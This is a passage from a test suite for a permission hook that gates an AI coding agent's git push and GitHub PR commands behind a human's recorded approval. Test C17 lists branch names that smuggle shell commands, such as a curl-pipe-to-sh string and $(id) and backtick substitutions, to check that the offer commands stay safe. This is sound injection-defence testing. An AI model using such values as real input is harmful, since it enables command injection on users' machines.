    expect(r?.pattern).toBe('open-pr');
    expect(r?.reason).toContain(`${ASK} open-pr`);
    expect(r?.reason).not.toMatch(/ship-ask|land-pr/);
    // Fix round 5 re-pin (F8): the create names --base dev, so its key is acme/app-x@main:dev (a tap with no base does not license it).
    tap('open-pr', 'acme/app-x@main', HEAD2, 'Open draft PR');
    expect(await passes(bash(cmd))).toBe(false);
    tap('open-pr', 'acme/app-x@main:dev', HEAD2, 'Open draft PR');
    expect(await passes(bash(cmd))).toBe(true);
  });
  it('a covered merge with a CCv3 PR URL in --body is judged with the folder key', async () => {
    mergeX();
    expect(await passes(bash(`${MERGE} ${PORT}`))).toBe(true);
  });
  it('a covered create whose gh segment names CCv3 (-R) keeps the CCv3 path', async () => {
    const r = await denyOf(bash(`${CREATE} -R Rev4nchist/Continuous-Claude-v3`));
    expect(r?.pattern).toBe('open-pr');
    expect(r?.reason).toMatch(/ship-ask/);
  });
  it('an unregistered folder with a CCv3 URL in --body keeps the CCv3 path, as before the card', async () => {
    const r = await denyOf(bash(`${CREATE} ${PORT}`, '/work/stray'));
    expect(r?.pattern).toBe('open-pr');
    expect(r?.reason).toMatch(/ship-ask/);
  });
});

describe('C16 a push -C path with backslashes is the folder it names (report of #0f5ea433)', () => {
  const BS: Folder = { remotes: gh('acme/bs') };
  const regBs = JSON.stringify({ projects: [...REGISTRY.projects, { key: 'bs', path: 'C:/work/bs' }] });
  const world = (calls: string[]): World => ({ folders: { ...FOLDERS, 'C:/work/bs': BS }, registry: regBs, calls });
  const GS = 'pwsh -File C:/Users/me/continuous-claude/scripts/git-safe.ps1';
  const cases: [string, string, string][] = [
    ['PowerShell, git -C unquoted', 'PowerShell', 'git -C C:\\work\\bs push up feat'],
    ['PowerShell, git-safe -C unquoted', 'PowerShell', `${GS} -C C:\\work\\bs push up feat`],
    ['Bash, git-safe -C single-quoted', 'Bash', `${GS} -C 'C:\\work\\bs' push up feat`],
    ['Bash, git -C double-quoted', 'Bash', 'git -C "C:\\work\\bs" push up feat'],
  ];
  /** As makeGit: a git call in a folder that does not exist throws MissingCwdError (the symptom of #0f5ea433 under the real Deps). */
  const realCwd = (calls: string[]): Deps => {
    const w = world(calls);
    const d = deps(w);
    return { ...d, git: (cwd, args) => { if (!(slash(cwd) in w.folders!)) throw new MissingCwdError(cwd); return d.git(cwd, args); } };
  };
  const run = async (tool: string, command: string, calls: string[] = []) =>
    JSON.parse(await handleParsed(JSON.stringify({ tool_name: tool, tool_input: { command }, cwd: '/work/app-y', session_id: 's-app' }), realCwd(calls)));
  // Change that breaks it: squashQuotes on the -C value (it deletes the backslashes: C:workbs), or a squashed-view shape that keeps that path.
  for (const [name, tool, command] of cases) {
    it(name, async () => {
      const calls: string[] = [];
      const reason: string = (await run(tool, command, calls)).hookSpecificOutput?.permissionDecisionReason ?? '';
      expect(calls.filter((c) => c.includes('C:workbs')), name).toEqual([]);
      expect(reason, name).not.toContain('could not verify');
      expect(reason, name).not.toContain('the working folder does not exist');
      // Fixer E: the real folder is judged: its own ship deny, with the offer for C:/work/bs.
      expect(reason, name).toContain(`${ASK} push --remote up --branch feat --src feat --dir 'C:/work/bs' --json`);
    });
  }
  // A forward-slash -C path never met squashQuotes trouble: its own decision is the ship deny of C:/work/bs, as before the fix. The last
  // check compares it with the backslash form, so it goes red with the backslash rows when squashQuotes is back on the -C value.
  it('a forward-slash -C path gives the same ship deny for the same folder (Bash and PowerShell)', async () => {
    for (const tool of ['Bash', 'PowerShell']) {
      const out = await run(tool, 'git -C C:/work/bs push up feat');
      expect(out.hookSpecificOutput.permissionDecision, tool).toBe('deny');
      expect(out.hookSpecificOutput.permissionDecisionReason, tool).toContain(`${ASK} push --remote up --branch feat --src feat --dir 'C:/work/bs' --json`);
      expect(out, tool).toEqual(await run('PowerShell', 'git -C C:\\work\\bs push up feat'));
    }
  });
  // Change that breaks (c) and (d): the push id keys on the raw -C value (p.dir) instead of squashQuotes(p.dir).
  it('(c) one push with a backslash -C path is exactly one push shape', () => {
    for (const [name, tool, command] of cases) {
      const shapes = pushShapesOf(command, tool);
      expect(shapes, name).toHaveLength(1);
      // The one shape is the raw reading: its -C value keeps the backslashes (squashQuotes on the value leaves C:workbs).
      expect(shapes[0].push?.dir, name).toContain('\\');
    }
  });
  it('(d) two -C spellings of one folder (differ only in backslashes), same remote and branch, collapse to one shape, and it is judged', async () => {
    const command = 'git -C "C:\\work\\bs" push up feat && git -C "C:\\\\work\\\\bs" push up feat';
    const shapes = pushShapesOf(command, 'Bash');
    expect(shapes).toHaveLength(1);
    expect(shapes[0].push?.dir).toBe('"C:\\work\\bs"');
    expect((await run('Bash', command)).hookSpecificOutput.permissionDecisionReason).toContain(`--dir 'C:/work/bs'`);
  });
});

// ---------- fix round 1, fixer B ----------

/** Every offer command in a text: from `node ` to ` --json`. */
const commandsIn = (text: string): string[] => [...text.matchAll(/node '?\S*app-ask\.mjs'?.*? --json/g)].map((m) => m[0]);
/** One word of an offer command: a plain word, a <placeholder>, or a single-quoted folder of plain path characters. */
const SAFE_WORD = /^(?:[A-Za-z0-9._/@+-]+|<[a-z]+>|'[A-Za-z0-9._/@+:\\ -]+')$/;
const wordsOf = (cmd: string): string[] => cmd.match(/'[^']*'|\S+/g) ?? [];

describe('C17 F2: a repo value goes into an offer command only as a plain word; else app-ask reads it itself, or one plain line (fixer G)', () => {
  const EVIL = ['fix;curl${IFS}x.sh|sh', 'x$(id)y', 'a`id`b', 'feat\u202Eabc', 'feat\u2018x', 'feat\u2019x'];
  // Fixer E: the odd branch is the remote HEAD branch too, so its push is a default-branch push and its deny text holds the value.
  const on = (branch: string): World => ({ folders: { ...FOLDERS, '/work/app-x': { remotes: gh('acme/app-x'), branch, heads: { [branch]: HEAD }, remoteHead: branch } } });
  // Fixer G re-pin (principal major F2 advice): the row pinned --branch <branch> plus "pass each value in single quotes", which is unsafe
  // for a ref name with ' ; $ ( ) or a backtick, and for U+2018 and U+2019 (PowerShell quote marks). The odd branch is the current branch,
  // so app-ask reads it itself: the command leaves --branch out.
  // Change that breaks it: askCmd puts the branch in raw again, keeps a placeholder, or a text prints a repo value without oneLine.
  for (const branch of EVIL) {
    it(`create on branch ${JSON.stringify(branch)}: no --branch in the command (app-ask reads it), no runnable form of the value`, async () => {
      const r = await denyOf(bash('gh pr create --draft --title t --body-file b.md'), on(branch));
      expect(r?.pattern).toBe('open-pr');
      const cmds = commandsIn(r!.reason);
      expect(cmds).toEqual([`${ASK} open-pr --remote up --dir '/work/app-x' --json`]);
      for (const cmd of cmds) for (const w of wordsOf(cmd)) expect(w, cmd).toMatch(SAFE_WORD);
      expect(r!.reason).toContain('app-ask reads the branch itself');
      expect(r!.reason).not.toMatch(/--branch|single quotes|fill in/);
      expect(r!.reason).not.toContain('\u202E');
      expect(r!.reason).not.toContain(`"${branch}"`);
    });
    // Fixer G re-pin (seat condition G4): the CCv3 text (openPrWhy) is byte-equal to base main 7a0e2f34 for every branch. A covered folder
    // reaches it with -R <the CCv3 repo>, so this row now pins the base text. The raw branch in it is a stated limit (open issue of the round).
    // Change that breaks it: openPrWhy prints a placeholder or a note again.
    it(`a covered create that names the CCv3 repo, on branch ${JSON.stringify(branch)}: the CCv3 text is the base text`, async () => {
      const r = await denyOf(bash('gh pr create -R Rev4nchist/Continuous-Claude-v3 --draft --title t --body-file b.md'), on(branch));
      expect(r?.pattern).toBe('open-pr');
      expect(r!.reason).toBe(baseOpenPr(branch, HEAD));
    });
    it(`push of branch ${JSON.stringify(branch)}: the branch is prose only, one plain line`, async () => {
      const r = await denyOf(bash('git push up'), on(branch));
      expect(r?.pattern).toBe('ship');
      expect(commandsIn(r!.reason)).toEqual([`${ASK} push --remote up --src HEAD --dir '/work/app-x' --json`]);
      for (const cmd of commandsIn(r!.reason)) for (const w of wordsOf(cmd)) expect(w, cmd).toMatch(SAFE_WORD);
      expect(r!.reason).not.toContain('\u202E');
      expect(r!.reason.split('\n')).toHaveLength(1);
    });
  }
  // Fixer G re-pin: --dir <folder> was a placeholder. The folder is the payload cwd, so the command leaves --dir out (app-ask takes its cwd).
  it('a folder with a quote mark that is the payload cwd: no --dir in the command, and the folder as prose', async () => {
    const r = await denyOf(bash(PUSH, "/work/it's"));
    expect(r?.pattern).toBe('ship');
    expect(commandsIn(r!.reason)).toEqual([`${ASK} push --remote up --branch feat --src feat --json`]);
    expect(r!.reason).toContain('app-ask reads the folder itself');
    expect(r!.reason).toContain("/work/it's");
  });
  // Fixer G re-pin: --remote <remote> was a placeholder for a URL. A URL is a plain word (: is safe in Bash, PowerShell and cmd).
  it('a remote that is a URL is a plain word; a safe branch, remote and folder stay plain words', async () => {
    // Fixer E: main, not feat (a URL target has only main and master as default branches).
    const url = await denyOf(bash('git push https://github.com/acme/app-x.git main'));
    expect(commandsIn(url!.reason)).toEqual([`${ASK} push --remote https://github.com/acme/app-x.git --branch main --src main --dir '/work/app-x' --json`]);
    const plain = await denyOf(bash(CREATE));
    expect(commandsIn(plain!.reason)).toEqual([`${ASK} open-pr --remote up --branch feat --dir '/work/app-x' --json`]);
  });
  // A named repo is only [\w.-] (commandRepo REPO_VALUE), so the entry key is the repo value that can carry a format character.
  it('a repo value in prose is one plain line: an entry key (local:<key>) with U+202E and a newline', async () => {
    const registry = JSON.stringify({ projects: [{ key: 'lo\u202Ecal\nx', path: '/work/local' }, ...REGISTRY.projects] });
    const r = await denyOf(bash('git push up feat', '/work/local'), { registry });
    expect(r?.pattern).toBe('ship');
    expect(r!.reason).toContain('local:lo cal x');
    expect(r!.reason).not.toMatch(/[\u202E\n]/);
  });
});

describe('C18 S5: the registry line stays when the same call also warns or denies (builder open issue)', () => {
  // Seat review 1, item 4 (re-pinned): a corrupt registry now denies, so the notice comes from a missing file named by LANE_REGISTRY_PATH.
  const corrupt = (extra: World = {}): World => ({ registry: null, registryEnv: true, ...extra });
  const MIXED = `gh pr merge 7 --match-head-commit ${HEAD} && cd /work/app-x && ${PUSH}`;
  // Change that breaks it: decide() drops the notes when a deny or a warn exists (the old `denies.length === 0` branch only).
  it('a deny in the CCv3 folder and an unreadable registry for the app folder: the deny text ends with the registry line', async () => {
    process.env.CCV3_GUARD_DECISIONS_LOG = `${scratch}/guard.jsonl`;
    const out = JSON.parse(await handleParsed(JSON.stringify(bash(MIXED, '/work/cc')), deps(corrupt())));
    expect(out.hookSpecificOutput.permissionDecision).toBe('deny');
    const reason: string = out.hookSpecificOutput.permissionDecisionReason;
    expect(reason).toMatch(/^BLOCKED \(decision-gate\): /);
    expect(reason.split('\n').pop()).toBe(CORRUPT_LINE);
    const rows = readFileSync(`${scratch}/guard.jsonl`, 'utf8').trim().split('\n').map((l) => JSON.parse(l));
    expect(rows.map((r) => r.reason.split(' ')[0])).toEqual(['land', 'registry-missing']);
  });
  it('the same call in warn mode: the warning, then the registry line', async () => {
    const out = JSON.parse(await handleParsed(JSON.stringify(bash(MIXED, '/work/cc')), deps(corrupt({ config: JSON.stringify({ decisions: {} }) }))));
    expect(out.hookSpecificOutput.permissionDecision).toBeUndefined();
    const lines = String(out.hookSpecificOutput.additionalContext).split('\n');
    expect(lines).toHaveLength(2);
    expect(lines[0]).toMatch(/^WARNING \(decision-gate, warn mode\)/);
    expect(lines[1]).toBe(CORRUPT_LINE);
  });
  it('decide() carries the notice on the deny and on the warn', async () => {
    expect(await verdict(bash(MIXED, '/work/cc'), corrupt())).toMatchObject({ action: 'deny', notice: '/reg/project-registry.json' });
    expect(await verdict(bash(MIXED, '/work/cc'), corrupt({ config: null }))).toMatchObject({ action: 'allow', notice: '/reg/project-registry.json' });
  });
});

describe('C19 F8: coverage starts no git process unless a live entry root holds the folder; no realpath on a network root', () => {
  const GATED = [PUSH, CREATE, MERGE];
  // Change that breaks it: drop the path pre-check in appPlace (rev-parse runs in every folder outside CCv3).
  it('an unregistered folder: push, create and merge start only git remote -v (as before the card)', async () => {
    for (const cmd of GATED) {
      const calls: string[] = [];
      expect(await passes(bash(cmd, '/work/stray'), { calls }), cmd).toBe(true);
      expect(calls, cmd).toEqual(['/work/stray: remote -v']);
    }
  });
  it('a folder under a CCv3 root entry only (continuous-claude) starts no coverage git either', async () => {
    const calls: string[] = [];
    expect(await passes(bash(PUSH, '/work/ccroot'), { calls })).toBe(true);
    expect(calls).toEqual(['/work/ccroot: remote -v']);
  });
  it('a linked worktree outside its root is still covered (its .git file names the root; no git start for that)', async () => {
    const calls: string[] = [];
    expect((await denyOf(bash(PUSH, '/work/wt-x'), { calls }))?.pattern).toBe('ship');
  });
  // Change that breaks it: realpath every entry root at read time (entryOf), or realpath a // or \\ root.
  it('a realpath that would block on a network root is never called with one; a raw match needs no entry realpath', async () => {
    const seen: string[] = [];
    const realpath = (p: string): string => {
      seen.push(p);
      if (/^[\\/]{2}/.test(p)) throw new Error(`realpath on a network path: ${p}`);
      return p;
    };
    const registry = JSON.stringify({ projects: [{ key: 'nas', path: '\\\\nas\\share\\app' }, { key: 'nas2', path: '//nas2/x' }, ...REGISTRY.projects] });
    for (const dir of ['/work/stray', '/work/app-x']) for (const cmd of GATED) await decideParsed(bash(cmd, dir), deps({ registry, realpath }));
    expect(seen.filter((p) => /^[\\/]{2}/.test(p))).toEqual([]);
    seen.length = 0;
    await decideParsed(bash(PUSH), deps({ registry, realpath }));
    expect(seen.filter((p) => slash(p).startsWith('/work/') && p !== '/work/app-x'), seen.join(' | ')).toEqual([]);
  });
});

describe('C20 one call reads each folder once (memo), and git stops at one deadline', () => {
  // Change that breaks it: drop the per-call git memo in decide().
  it('a create and a push in one folder start git remote -v and the coverage rev-parse once each', async () => {
    const calls: string[] = [];
    await decideParsed(bash(`${CREATE} && ${PUSH}`), deps({ calls }));
    expect(calls.filter((c) => c === '/work/app-x: remote -v')).toHaveLength(1);
    expect(calls.filter((c) => c.startsWith('/work/app-x: rev-parse --path-format'))).toHaveLength(1);
  });
  it('a position-unknown push with no covered folder reads each folder once (the known folders are judged again after the position test)', async () => {
    const calls: string[] = [];
    await decideParsed(bash(`cd /work/app-x/nested && popd && ${PUSH}`, '/work/stray'), deps({ calls }));
    expect(calls.length).toBeGreaterThan(0);
    const counts = new Map<string, number>();
    for (const c of calls) counts.set(c, (counts.get(c) ?? 0) + 1);
    expect([...counts].filter(([, n]) => n > 1), calls.join(' | ')).toEqual([]);
  });
  // Change that breaks it: makeGit ignores the deadline, or the spawn timeout is not cut to the time left.
  it('makeGit: past the deadline it throws a timeout error and starts nothing; before it, the spawn timeout is the time left', () => {
    const seen: number[] = [];
    const spawn = (_c: string, _a: string[], o: { timeout?: number }) => { seen.push(o.timeout ?? -1); return { status: 0, stdout: 'ok', stderr: '', pid: 1, output: [], signal: null }; };
    const late = makeGit({ deadline: 1000, now: () => 1000, spawn, exists: () => true });
    expect(() => late('/x', ['remote', '-v'])).toThrow(/time limit/);
    expect(seen).toEqual([]);
    makeGit({ deadline: 1000, now: () => 400, spawn, exists: () => true })('/x', ['status']);
    makeGit({ deadline: 5000, now: () => 0, spawn, exists: () => true })('/x', ['status']);
    makeGit({ spawn, exists: () => true })('/x', ['status']);
    expect(seen).toEqual([600, 2000, 2000]);
  });
  it('a deadline throw in a covered folder is unjudgeable with scope app-push (denied), with the cause named', async () => {
    const d = deps();
    const late: Deps = { ...d, git: (cwd, args) => (args[0] === 'rev-parse' && args[1].endsWith('^{tree}') ? (() => { throw new GitDeadlineError(args); })() : d.git(cwd, args)) };
    const out = JSON.parse(await handleParsed(JSON.stringify(bash(PUSH)), late));
    expect(out.hookSpecificOutput.permissionDecision).toBe('deny');
    expect(out.hookSpecificOutput.permissionDecisionReason).toMatch(/could not verify Dave's tap \(.*time limit/);
  });
});

// ---------- C21: ONE key rule (fix round 1, fixer C: F3 to F6 and the key minors) ----------

const TREE2 = 'u'.repeat(40);
/** The words of the first app-ask command of a deny text (after the script path, before --json). Fixer G: no placeholder to fill in. */
function askWords(reason: string): string[] {
  const [cmd] = commandsIn(reason);
  expect(cmd, reason).toBeDefined();
  return wordsOf(cmd).slice(2, -1).map((w) => w.replace(/^'(.*)'$/, '$1'));
}
const entryOf = (dir: string): { key: string; github: string | null } => {
  const e = REGISTRY.projects.find((p) => p.path === dir)!;
  return { key: e.key, github: e.github ?? null };
};
/**
 * Dave's tap through the REAL app-ask plan: parseArgs of the deny command, then planWith over the same fake git and the registry entry of
 * the folder. The tap records the plan's own key, head, tree and first label: no key is built by hand here.
 */
function tapByAsk(reason: string, w: World = {}): { key: string; tree: string | null } {
  const parsed = appAsk.parseArgs(askWords(reason));
  expect(parsed.error, reason).toBeUndefined();
  const dir: string = parsed.o.dir;
  const f = (w.folders ?? FOLDERS)[dir];
  const git = (args: string[]) => answer(f, dir, args.join(' '));
  const view = () => ({ headRefOid: HEAD, state: 'OPEN', isDraft: false, title: 't' });
  const plan = appAsk.planWith(parsed.o, { git, entry: entryOf(dir), view });
  tap(appAsk.STORE_STEP[parsed.o.sub], plan.key, plan.head, plan.spec.options[0].label, plan.tree ?? undefined);
  return plan;
}
/** Denied with no tap; allowed after the tap that the deny's own offer command records. */
async function allowAfterAsk(input: object, w: World = {}): Promise<{ key: string; tree: string | null }> {
  const r = await denyOf(input, w);
  expect(r, 'denied before the tap').not.toBeNull();
  const plan = tapByAsk(r!.reason, w);
  expect(await verdict(input, w), `${plan.key}: ${r!.reason}`).toEqual({ action: 'allow' });
  return plan;
}
const at = (dir: string, f: Folder): World => ({ folders: { ...FOLDERS, [dir]: f } });

describe('C21 ONE key rule: each deny command, run through the real app-ask plan, records the key the gate reads (F3 to F6)', () => {
  // Change that breaks the push rows: drop --branch or --src from appPushWhy, or key app-ask on the current branch or HEAD tree again.
  it('F3 bare push: the remote and branch of @{push}', async () => {
    expect((await allowAfterAsk(bash('git push'), at('/work/app-x', { remotes: gh('acme/app-x'), pushRef: 'up/feat' }))).key).toBe('acme/app-x@feat');
  });
  it('minor: a bare push with push.default=upstream (feat tracks up/main) keys on main; a tap for feat does not license it', async () => {
    const w = at('/work/app-x', { remotes: gh('acme/app-x'), pushRef: 'up/main' });
    shipX();
    expect((await denyOf(bash('git push'), w))?.pattern).toBe('ship');
    expect((await allowAfterAsk(bash('git push'), w)).key).toBe('acme/app-x@main');
  });
  it('F3 another branch (git push up feat while on main): the key is feat and the tap binds the tree of feat, not of HEAD', async () => {
    const w = at('/work/app-x', { remotes: gh('acme/app-x'), branch: 'main', trees: { HEAD: TREE, main: TREE, feat: TREE2 } });
    const plan = await allowAfterAsk(bash('git push up feat'), w);
    expect([plan.key, plan.tree]).toEqual(['acme/app-x@feat', TREE2]);
  });
  // Fixer E: release is the remote HEAD branch here, so the push needs the tap (else release is no default branch and passes untapped).
  it('F3 a refspec (git push up HEAD:release): the key is release and the tree is of HEAD', async () => {
    const plan = await allowAfterAsk(bash('git push up HEAD:release'), at('/work/app-x', { remotes: gh('acme/app-x'), remoteHead: 'release' }));
    expect([plan.key, plan.tree]).toEqual(['acme/app-x@release', TREE]);
  });
  // Fixer E: main, not feat (a URL target has only main and master as default branches).
  it('F3 a URL remote: the offer takes the URL (filled in from the note) and keys on it', async () => {
    expect((await allowAfterAsk(bash('git push https://github.com/acme/app-x.git main'))).key).toBe('acme/app-x@main');
  });
  it('F3 nothing ahead of the remote: app-ask still writes Push only, and the push passes after that tap', async () => {
    expect((await allowAfterAsk(bash(PUSH), at('/work/app-x', { remotes: gh('acme/app-x'), ahead: 0 }))).key).toBe('acme/app-x@feat');
  });
  it('F5 a remote name that holds a slash is resolved by git, not read as a URL', async () => {
    expect((await allowAfterAsk(bash('git push team/fork feat', '/work/slash'))).key).toBe('acme/slash@feat');
  });
  // Change that breaks it: split @{push} on the first / or by the shortest remote name (the key is then acme/team@fork/feat).
  it('F5 a bare push whose @{push} remote holds a slash (remotes team and team/fork) keys on team/fork and its branch', async () => {
    const w = at('/work/slash', { remotes: { team: 'https://github.com/acme/team.git', 'team/fork': 'https://github.com/acme/slash.git' }, pushRef: 'team/fork/feat' });
    expect((await allowAfterAsk(bash('git push', '/work/slash'), w)).key).toBe('acme/slash@feat');
  });
  it('minor: two push URLs of two repos are denied push-urls, scope app-push, tap or not', async () => {
    tap('ship', 'acme/multi@feat', HEAD, 'Commit and push', TREE);
    const r = await denyOf(bash(PUSH, '/work/multi'));
    expect(r).toMatchObject({ pattern: 'push-urls', scope: 'app-push' });
    expect(r!.reason).toContain('one push URL');
  });
  it('minor: two non-GitHub targets of one entry have two keys: the tap for one does not license a push to the other', async () => {
    // Fixer E: main, not feat (a path target has only main and master as default branches).
    expect((await allowAfterAsk(bash('git push up main', '/work/local'))).key).toBe('local:local-app:/srv/git/local.git@main');
    expect((await denyOf(bash('git push /srv/git/other.git main', '/work/local')))?.pattern).toBe('ship');
  });
  // Change that breaks it: compare a named repo with the @{push} key only (F4), or drop --remote from the create and merge offers.
  it('F4 two remotes and no @{push}: a create or merge that names the repo of one remote passes after the offer it is given', async () => {
    expect((await allowAfterAsk(bash(`${CREATE} -R acme/two-mirror`, '/work/two'))).key).toBe('acme/two-mirror@feat');
    expect((await allowAfterAsk(bash(`${MERGE} -R acme/two-mirror`, '/work/two'))).key).toBe('acme/two-mirror#7');
  });
  it('F4 two remotes, no @{push} and no repo named: the deny names the way out (-R, --remote, or an upstream)', async () => {
    const r = await denyOf(bash(CREATE, '/work/two'));
    expect(r?.pattern).toBe('repo-unnamed');
    expect(r!.reason).toContain('-R <owner/repo>');
    expect(r!.reason).toContain('git branch --set-upstream-to=<remote>/<branch>');
    expect(r!.reason).toContain('--remote <remote>');
  });
  // Change that breaks it: ignore the github field of the entry (the alias remote keys as local:, and app-ask refuses open-pr).
  it('F5 an SSH host alias remote keys on the github field of the entry, in the gate and in app-ask', async () => {
    expect((await allowAfterAsk(bash(CREATE, '/work/alias'))).key).toBe('acme/alias@feat');
    expect((await allowAfterAsk(bash(`${MERGE} -R acme/alias`, '/work/alias'))).key).toBe('acme/alias#7');
  });
  // Change that breaks it: let a URL typed in the command take the github field (its owner/repo tail is the same as the alias remote's).
  it('F5 the github field never licenses a URL typed in the command: after the alias push tap, a push to gitlab with the same owner/repo is denied', async () => {
    // Fixer E: main, not feat (the typed gitlab URL has only main and master as default branches).
    expect((await allowAfterAsk(bash('git push origin main', '/work/alias'))).key).toBe('acme/alias@main');
    expect((await denyOf(bash('git push https://gitlab.com/Acme/Alias.git main', '/work/alias')))?.pattern).toBe('ship');
  });
  // Change that breaks it: key a create or merge on the push URL (the tap then names me/fork while gh acts on acme/upstream).
  it('F6 a remote that fetches from one repo and pushes to another: a create with no -R is denied with "add -R"; with -R of the fetch repo it passes', async () => {
    const r = await denyOf(bash(CREATE, '/work/split'));
    expect(r?.pattern).toBe('fetch-push-differ');
    expect(r!.reason).toContain('-R acme/upstream');
    expect((await allowAfterAsk(bash(`${CREATE} -R acme/upstream`, '/work/split'))).key).toBe('acme/upstream@feat');
    expect((await denyOf(bash(`${CREATE} -R me/fork`, '/work/split')))?.pattern).toBe('repo-differs');
  });
  it('F6 a push from that folder keys on the push URL (where the push goes)', async () => {
    expect((await allowAfterAsk(bash('git push origin feat', '/work/split'))).key).toBe('me/fork@feat');
  });
  it('a plain covered create and merge pass after their own offer', async () => {
    expect((await allowAfterAsk(bash(CREATE))).key).toBe('acme/app-x@feat');
    expect((await allowAfterAsk(bash(MERGE))).key).toBe('acme/app-x#7');
  });
});

// ---------- C22: Dave's decision of 2026-11-13 (fixer E; replaces D2 a for the push only) ----------

const TREES_ALL: Record<string, string> = { HEAD: TREE, '@': TREE, feat: TREE, main: TREE, master: TREE, develop: TREE, topic: TREE, dev: TREE };
/** /work/app-x on feat; refs/remotes/up/HEAD names develop. */
const devX = (extra: Folder = {}): World => at('/work/app-x', { remotes: gh('acme/app-x'), remoteHead: 'develop', trees: TREES_ALL, ...extra });
/** A git start that reads a tree for the tap (rev-parse <ref>^{tree}, write-tree). The tap is read only after it (shipTap). */
const TREE_READ = /\^\{tree\}$|: write-tree$/;
const allowed = async (input: object, w: World): Promise<void> => expect(await verdict(input, w), JSON.stringify(input)).toEqual({ action: 'allow' });

describe('C22 a covered push to a branch that is not a default branch of its target passes with no tap (Dave 11-13)', () => {
  // Change that breaks it: drop the branch test in judgeAppPush (every covered push needs a tap again, D2 a).
  it('a push of feat (not main, master or the remote HEAD branch develop): allowed, no tree read, no offer text', async () => {
    const calls: string[] = [];
    await allowed(bash('git push up feat'), { ...devX(), calls });
    expect(calls.filter((c) => TREE_READ.test(c)), calls.join(' | ')).toEqual([]);
    expect(calls.filter((c) => c.endsWith('symbolic-ref --quiet --short refs/remotes/up/HEAD'))).toHaveLength(1);
  });
  // Change that breaks it: drop main or master from the default set, or drop the remote HEAD read (develop then passes).
  for (const b of ['main', 'master', 'develop']) {
    it(`a push of ${b} with no tap is denied ship, scope app-push, and the text names the default branch`, async () => {
      const r = await denyOf(bash(`git push up ${b}`), devX());
      expect(r).toMatchObject({ pattern: 'ship', scope: 'app-push' });
      expect(r!.reason).toContain(`${b}, a default branch of acme/app-x`);
    });
  }
  // Change that breaks it: judge the source of a refspec, not its destination; or allow a command when one refspec is not a default branch.
  // Fix round 3 re-pin (fixer H, strict allow-list): main:feat (a colon) and 'feat topic' (a third positional) were allows; now the tap path.
  const specs: [string, 'allow' | 'ship'][] = [
    ['HEAD:main', 'ship'], ['feat:main', 'ship'], ['main:feat', 'ship'], ['feat main', 'ship'], ['feat topic', 'ship'],
    ['HEAD:develop', 'ship'], ['feat:refs/heads/main', 'ship'],
  ];
  for (const [spec, want] of specs) {
    it(`git push up ${spec}: ${want}`, async () => {
      if (want === 'allow') await allowed(bash(`git push up ${spec}`), devX());
      else expect((await denyOf(bash(`git push up ${spec}`), devX()))?.pattern).toBe(want);
    });
  }
  // Change that breaks it: compare the destination text as written (git matches heads/main as refs/heads/main, and reads @ as HEAD).
  // Fix round 3 re-pin (fixer H): @ on feat was an allow; @ is off the strict allow-list, so it takes the tap path on any branch.
  it('git spellings of a default branch stay denied: feat:heads/main, and @ on main; @ on feat takes the tap path too', async () => {
    expect((await denyOf(bash('git push up feat:heads/main'), devX()))?.pattern).toBe('ship');
    expect((await denyOf(bash('git push up @'), devX({ branch: 'main' })))?.pattern).toBe('ship');
    expect((await denyOf(bash('git push up @'), devX()))?.pattern).toBe('ship');
  });
  // Change that breaks it: move the branch test above the subagent or force checks.
  it('force, delete and a subagent push of feat stay denied, scope app-push', async () => {
    for (const cmd of ['git push --force up feat', 'git push up +feat', 'git push -d up feat', 'git push --delete up feat', 'git push up :feat']) {
      expect(await denyOf(bash(cmd), devX()), cmd).toMatchObject({ pattern: 'push-unsafe', scope: 'app-push' });
    }
    expect(await denyOf(bash('git push up feat', '/work/app-x', { agent_id: 'sub1' }), devX())).toMatchObject({ pattern: 'subagent', scope: 'app-push' });
  });
  // Fixer F re-pin (critic major 3): a URL of the same GitHub repo as remote up takes the remote HEAD of up (develop). Before, the row
  // pinned 'no remote HEAD is read for a URL', so a push of develop by URL passed with no tap.
  // Change that breaks it: give a URL target only main and master again (develop by URL passes).
  // Fix round 3 re-pin (fixer H, strict allow-list): a URL is no configured remote name, so feat by URL takes the tap path too.
  it('a URL target with the slug of remote up: feat, main and develop (the HEAD of up) all take the tap path', async () => {
    expect(await denyOf(bash('git push https://github.com/acme/app-x.git feat'), devX())).toMatchObject({ pattern: 'ship', scope: 'app-push' });
    expect((await denyOf(bash('git push https://github.com/acme/app-x.git main'), devX()))?.pattern).toBe('ship');
    expect(await denyOf(bash('git push git@github.com:Acme/App-X.git develop'), devX())).toMatchObject({ pattern: 'ship', scope: 'app-push' });
  });
  // Change that breaks it: allow when the destination cannot be named (fail open).
  it('an unresolved destination stays denied: detached HEAD, no remote and no @{push}, an unknown remote', async () => {
    expect((await denyOf(bash('git push up'), devX({ branch: '' })))?.pattern).toBe('push-target-unresolved');
    expect((await denyOf(bash('git push'), devX()))?.pattern).toBe('push-remote-unresolved');
    expect((await denyOf(bash('git push nowhere feat'), devX()))?.pattern).toBe('push-remote-unresolved');
    expect((await denyOf(bash('git push up -- -x:feat'), devX()))?.pattern).toBe('push-target-unresolved');
  });
  // Change that breaks it: split the remote HEAD output on the first / (team/fork/dev then names fork/dev, and dev passes).
  // Fix round 3 re-pin (fixer H): a remote name with / is off the strict allow-list (^[A-Za-z0-9][A-Za-z0-9._-]*$), so feat takes the
  // tap path there too. A bare push whose @{push} remote holds a / still reads the HEAD after the whole remote name.
  it('a remote name with a slash: its HEAD branch is cut after the whole remote name', async () => {
    const w = at('/work/slash', { remotes: { 'team/fork': 'https://github.com/acme/slash.git' }, remoteHead: 'dev', trees: TREES_ALL });
    expect((await denyOf(bash('git push team/fork dev', '/work/slash'), w))?.pattern).toBe('ship');
    expect((await denyOf(bash('git push team/fork feat', '/work/slash'), w))?.pattern).toBe('ship');
    expect((await denyOf(bash('git push', '/work/slash'), { folders: { ...w.folders, '/work/slash': { ...w.folders!['/work/slash'], pushRef: 'team/fork/dev' } } }))?.pattern).toBe('ship');
    await allowed(bash('git push', '/work/slash'), { folders: { ...w.folders, '/work/slash': { ...w.folders!['/work/slash'], pushRef: 'team/fork/feat' } } });
  });
  // Change that breaks it: key a bare push on the current branch (feat) instead of the branch of @{push}.
  it('a bare push (push.default=upstream): @{push} up/develop is denied, up/topic passes', async () => {
    expect((await denyOf(bash('git push'), devX({ pushRef: 'up/develop' })))?.pattern).toBe('ship');
    await allowed(bash('git push'), devX({ pushRef: 'up/topic' }));
  });
  // Change that breaks it: read the --short output only as <remote>/<branch> (a local branch up/develop makes git print remotes/up/develop).
  // Fixer F re-pin (critic minor, principal minor): an empty line and a missing remote HEAD were pinned as allow. The default branch is
  // then not known, so every destination takes the tap path (fail closed).
